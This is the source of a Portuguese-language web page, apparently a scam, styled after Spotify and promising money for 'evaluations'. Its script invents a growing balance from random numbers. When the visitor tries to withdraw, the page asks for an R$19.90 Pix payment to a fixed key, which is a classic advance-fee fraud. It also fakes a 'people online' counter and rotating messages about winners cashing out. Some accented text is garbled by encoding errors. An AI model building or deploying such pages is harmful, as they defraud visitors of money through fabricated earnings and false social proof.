<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Avalie & Ganhe â€“ Futurista Spotify</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet"/>
  <style>
    /* RESET */
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family:'Poppins', sans-serif;
      background: linear-gradient(45deg, #121212 0%, #1db954 100%);
      color: #e0e0e0;
      display:flex; flex-direction:column; align-items:center; justify-content:center;
      min-height:100vh; overflow:hidden;
    }

    h1 {
      font-size:4rem; font-weight:800; color:#1db954;
      text-align:center; text-transform:uppercase;
      text-shadow: 0 0 20px rgba(29,185,84,0.8);
      letter-spacing:0.1em; margin-bottom:40px;
    }

    button {
      font-family:'Poppins', sans-serif; font-weight:800;
      border:none; border-radius:50px; cursor:pointer;
      padding:20px 60px; font-size:1.6rem; color:#000;
      background: linear-gradient(135deg, #1db954 0%, #17a94d 100%);
      box-shadow: 0 8px 25px rgba(23,169,77,0.6);
      transition: all 0.3s ease;
      letter-spacing:0.05em;
    }

    button:disabled {
      opacity: 0.5; cursor: not-allowed; box-shadow: none;
    }

    button#avaliarBtn:hover:not(:disabled),
    button#copyBtn:hover { transform: translateY(-4px); background:#17a94d; box-shadow:0 10px 35px rgba(23,169,77,0.7); }

    button#sacarBtn { display:none; font-size:1.4rem; padding:18px 60px; margin-top:20px; }

    #status, #total {
      font-size:1.3rem; font-weight:600;
      text-shadow:0 0 10px rgba(29,185,84,0.7); margin:15px 0;
    }

    #inputContainer {
      display:none; margin-top:25px; width:100%; max-width:480px;
    }

    label {
      color:#ccc; font-size:1.1rem; margin-bottom:6px; display:block;
    }

    input[type=text] {
      width:100%; padding:16px; font-size:1.2rem;
      background:#222; color:#e0e0e0; border:none;
      border-radius:12px; box-shadow: inset 0 0 6px #000;
    }

    input[type=text]:focus { outline:2px solid #1db954; }

    #errorMsg {
      color:#ff4f4f; font-size:1rem; margin-top:6px; min-height:1.2em;
    }

    #pixSection {
      display:none; margin-top:30px; background:#111;
      color:#1db954; font-family:'Courier New', monospace;
      padding:24px; border-radius:16px;
      box-shadow: 0 0 15px #1db954aa inset;
      font-size:1.3rem; text-align:center;
    }

    #copyBtn { display:none; margin-top:20px; padding:18px 50px; background: linear-gradient(135deg, #1db954, #17a94d); font-size:1.3rem; color:#000; box-shadow: 0 8px 25px rgba(23,169,77,0.6); }

    #message {
      margin-top:30px; font-size:1.3rem; font-weight:600;
      color:#ccc; text-align:center; max-width:480px; line-height:1.4; min-height:6rem;
    }

    /* NEON EFFECT OVERLAY */
    body::after {
      content:""; position:fixed; top:0; left:0;
      width:100%; height:100%;
      background: radial-gradient(circle at bottom left, rgba(29,185,84,0.2), transparent 60%);
      pointer-events:none;
    }

    /* FALLING EMOJI */
    @keyframes fallMoney { 0%{opacity:1;transform:translateY( -40px);} 100%{opacity:0;transform:translateY(100vh);} }

    /* ONLINE COUNTER */
    #onlineCounter {
      position:fixed; top:30px; left:30px;
      font-size:1rem; font-weight:800;
      color:#1db954; background: rgba(0,0,0,0.8);
      padding:12px 18px; border-radius:8px;
      box-shadow:0 0 10px #1db954aa; z-index:9999;
      letter-spacing:0.05em;
    }

    /* GAMBLER MESSAGES */
    #ganhadores {
      position:fixed; bottom:30px; left:30px;
      z-index:9999; max-width:320px; pointer-events:none;
    }

    .ganhador-msg {
      background: rgba(0,0,0,0.85);
      color:#e0e0e0; padding:14px 18px;
      border-left:4px solid #1db954; border-radius:8px;
      margin-top:12px; animation:fadeMsg 6s ease forwards;
      box-shadow:0 0 12px #1db954aa;
      font-size:1rem;
    }

    @keyframes fadeMsg { 0%{opacity:0;transform: translateX(-30px);} 15%,85%{opacity:1;transform:translateX(0);} 100%{opacity:0;transform: translateX(-30px);} }
  </style>
</head>
<body>
  <div id="onlineCounter">234 pessoas online agora</div>
  <div id="ganhadores" aria-hidden="true"></div>

  <h1>AVALIE & GANHE</h1>
  <button id="avaliarBtn">AVALIAR</button>
  <p id="status">AvaliaÃ§Ãµes feitas: 0 / 5</p>
  <p id="total">Dinheiro acumulado: R$ 0,00</p>

  <div id="inputContainer">
    <label for="userKey">Informe eâ€‘mail ou chave Pix:</label>
    <input type="text" id="userKey" placeholder="exemplo@exemplo.com ou chave Pix"/>
    <div id="errorMsg" role="alert"></div>
  </div>

  <button id="sacarBtn">Sacar Agora</button>

  <div id="pixSection">
    <p>Chave Pix para pagamento:</p>
    <p id="pixKey">681258edâ€‘77f1â€‘4cd4â€‘84e2â€‘34074cf1e54d</p>
  </div>

  <button id="copyBtn">Copiar Chave Pix</button>
  <div id="message" role="status"></div>

  <audio id="moneySound" src="https://actions.google.com/sounds/v1/cash/register_cash_register_open.ogg" preload="auto"></audio>

  <script>
    const avaliarBtn = document.getElementById('avaliarBtn');
    const status = document.getElementById('status');
    const totalP = document.getElementById('total');
    const moneySound = document.getElementById('moneySound');
    const sacarBtn = document.getElementById('sacarBtn');
    const inputContainer = document.getElementById('inputContainer');
    const userKeyInput = document.getElementById('userKey');
    const errorMsg = document.getElementById('errorMsg');
    const pixSection = document.getElementById('pixSection');
    const copyBtn = document.getElementById('copyBtn');
    const message = document.getElementById('message');

    let count=0, total=0;

    function createMoneyFall(){
      const el = document.createElement('div');
      el.textContent = 'ðŸ’¸';
      Object.assign(el.style,{
        position:'fixed',
        left: Math.random()*100+'vw',
        top: '-40px',
        fontSize: (24+Math.random()*14)+'px',
        animation: 'fallMoney 2s linear',
        color: '#1db954dd',
        zIndex: '9999',
        userSelect:'none'
      });
      document.body.appendChild(el);
      setTimeout(()=>el.remove(),2000);
    }

    avaliarBtn.addEventListener('click',()=>{
      if(count>=5) return;
      avaliarBtn.disabled=true; avaliarBtn.textContent='CARREGANDO...';
      moneySound.currentTime=0; moneySound.play();
      let interval = setInterval(createMoneyFall, 150);
      setTimeout(()=>{
        clearInterval(interval);
        const valor = (Math.random()*60+40).toFixed(2);
        total+=parseFloat(valor); count++;
        status.textContent=`AvaliaÃ§Ãµes feitas: ${count} / 5`;
        totalP.textContent=`Dinheiro acumulado: R$ ${total.toFixed(2)}`;
        avaliarBtn.textContent='AVALIAR'; avaliarBtn.disabled = count>=5;
        if(count>=5){
          sacarBtn.style.display='inline-block';
          inputContainer.style.display='block';
        }
      }, 1000);
    });

    sacarBtn.addEventListener('click',()=>{
      errorMsg.textContent=''; const userKey = userKeyInput.value.trim();
      if(!userKey){ errorMsg.textContent='Por favor, insira um eâ€‘mail ou chave Pix vÃ¡lida.'; userKeyInput.focus(); return; }
      sacarBtn.disabled=true; sacarBtn.textContent='CARREGANDO...';
      setTimeout(()=>{
        message.innerHTML = `
          VocÃª acumulou <strong>R$ ${total.toFixed(2)}</strong><br/>
          Para liberar o saque, faÃ§a um pagamento de <strong>R$ 19,90</strong> via Pix.<br/>
          ApÃ³s envio, valor liberado em atÃ© 5 minutos!<br/>
          <em>Envie o comprovante para: <strong>${userKey}</strong></em>`;
        sacarBtn.style.display='none'; pixSection.style.display='block'; copyBtn.style.display='inline-block';
        sacarBtn.disabled=false; sacarBtn.textContent='Sacar Agora';
      },1000);
    });

    copyBtn.addEventListener('click',()=>{
      navigator.clipboard.writeText(document.getElementById('pixKey').textContent)
        .then(()=>{ copyBtn.textContent='Chave copiada!'; setTimeout(()=>copyBtn.textContent='Copiar Chave Pix',2000); })
        .catch(()=>alert('Erro ao copiar. Copie manualmente.'));
    });

    const ganhadores = [
      'Maria Eduarda sacou R$ 800',
      'FabrÃ­cio sacou R$ 700',
      'PatrÃ­cia Almeida sacou R$ 430',
      'Lucas Fernandes sacou R$ 610',
      'JoÃ£o Pedro sacou R$ 1020',
      'Carla Lopes sacou R$ 520'
    ];
    const ganhadoresContainer = document.getElementById('ganhadores');

    function mostrarGanhador(){
      const m = document.createElement('div');
      m.className='ganhador-msg';
      m.textContent=ganhadores[Math.floor(Math.random()*ganhadores.length)];
      ganhadoresContainer.appendChild(m);
      setTimeout(()=>m.remove(),6000);
    }
    setInterval(mostrarGanhador, Math.random()*5000 + 5000);

    const onlineCounter = document.getElementById('onlineCounter');
    function atualizarContador(){
      const n = Math.floor(Math.random()*120)+180;
      onlineCounter.textContent=`${n} pessoas online agora`;
    }
    setInterval(atualizarContador,4000);
    atualizarContador();
  </script>
</body>
</html>
